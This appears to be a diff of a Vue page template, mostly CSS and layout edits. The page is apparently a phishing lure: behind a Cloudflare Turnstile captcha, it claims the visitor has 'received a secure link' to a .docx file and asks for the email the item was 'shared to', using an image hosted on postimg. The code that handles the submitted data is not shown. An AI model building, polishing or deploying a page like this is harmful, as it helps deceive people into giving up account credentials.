@@ -1,4 +1,3 @@
-
 <template>
   <div v-if="!captchaToken" class="gate-container">
     <main>
@@ -13,11 +12,7 @@
     <div class="overlay" id="overlay">
       <div class="input-section" id="inputSection">
         <form @submit.prevent="submitForm">
-          <img
-            src="https://i.postimg.cc/s2TBQ89k/ldimg1.png"
-            width="100"
-            height="35"
-          >
+          <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="100" height="35">
           <p>You've received a secure link to:</p>
           <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
           <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
@@ -34,17 +29,12 @@
             {{ loading ? 'Submitting…' : 'Next' }}
           </button>
 
-          <p>
-            <br>
-            © 2025 Privacy Policy
-            <br><br><br>
-          </p>
+          <p><br> © 2025 Privacy Policy<br><br><br></p>
         </form>
       </div>
     </div>
   </div>
 </template>
-
 
 <script setup>
 import { ref, onMounted, nextTick } from 'vue'
@@ -126,15 +116,15 @@ async function submitForm() {
 }
 </script>
 
-
 <style scoped>
-body {
-  font-family: Arial, sans-serif;
-  text-align: center;
+body, html {
+  height: 100%;
+  width: 100%;
   margin: 0;
   padding: 0;
+  font-family: Arial, sans-serif;
   background-color: #f7f9f9;
-  height: 100%;
+  color: #000;
 }
 
 .container {
@@ -142,45 +132,31 @@ body {
   flex-direction: column;
   align-items: center;
   justify-content: center;
-  min-height: 76vh;
+  min-height: 100vh;
 }
 
-.logo {
-  width: 150px;
-  margin-bottom: 20px;
-  margin-top: 20px;
-}
-
-iframe {
-  width: 100%;
-  height: 90%;
-  border: none;
-  display: block;
-  margin: 0 auto;
-  overflow-x: hidden;
-  object-fit: contain;
-  object-position: center;
-}
-
-.blurred {
-  filter: blur(10px);
+.overlay {
+  margin: 5;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  height: 100vh;
+  background-color: #f9f9f9;
+  padding-top: 50px;
 }
 
 .input-section {
-  position: absolute;
-  top: 40%;
-  left: 50%;
-  transform: translate(-50%, -50%);
   background-color: #fff;
   padding: 13px;
   border: 0.1px solid #dddd;
   text-align: center;
   width: 150%;
   max-width: 324px;
+  transform: translateY(10vh);
 }
 
-.input-section p {
-  margin: 8px 0;
+.input-section p,
+.input-section input {
   color: black;
 }
 
@@ -193,7 +169,6 @@ iframe {
   border: 1px solid #ccc;
   font-size: 16px;
   box-sizing: border-box;
-  color: black;
 }
 
 .input-section button {
@@ -209,14 +184,22 @@ iframe {
   background-color: #1D7CDB;
 }
 
-.overlay {
-  margin: 5;
+.cf-turnstile {
+  transform: scale(0.9);
+  transform-origin: center;
+  height: auto !important;
+  width: auto !important;
+  margin-top: 2rem;
+}
+
+.captcha-adjusted {
   display: flex;
+  flex-direction: column;
+  align-items: center;
   justify-content: center;
-  align-items: flex-start;
-  height: 80vh;
-  background-color: #f9f9f9;
-  padding-top: 50px;
+  height: 100vh;
+  padding: 0 1rem;
+  text-align: center;
 }
 
 .visually-hidden {
@@ -228,18 +211,6 @@ iframe {
   white-space: nowrap;
 }
 
-.cf-turnstile {
-  transform: scale(0.9);
-  transform-origin: center;
-  height: auto !important;
-  width: auto !important;
-  margin-top: 1rem;
-}
-
-  .captcha-adjusted {
-  margin-top: 25vh !important;    
-} 
-  
 .error {
   color: red;
   font-size: 0.9rem;
@@ -247,49 +218,6 @@ iframe {
   margin-bottom: 10px;
 }
 
-
-@media (prefers-color-scheme: dark) {
-  html, body,
-  .container,
-  .overlay {
-    background-color: #121212 !important;
-    color: #000 !important; /* Force black text for contrast */
-  }
-
-  .input-section {
-    background-color: #1e1e1e !important;
-    border-color: #333 !important;
-  }
-
-  .input-section input {
-    background-color: #2b2b2b !important;
-    border-color: #444 !important;
-    color: #ffffff !important;
-  }
-
-  .input-section button {
-    background-color: #005fa3 !important;
-  }
-
-  .input-section button:hover {
-    background-color: #0078d4 !important;
-  }
-
-  .error {
-    color: #ff6b6b !important;
-  }
-
-/* Center CAPTCHA vertically */
-.captcha-adjusted {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-  padding: 0 1rem;
-}
-
-/* Updated dark mode: full black background, white text */
 @media (prefers-color-scheme: dark) {
   html, body,
   .container,
@@ -322,5 +250,4 @@ iframe {
     color: #ff6b6b !important;
   }
 }
-
 </style>
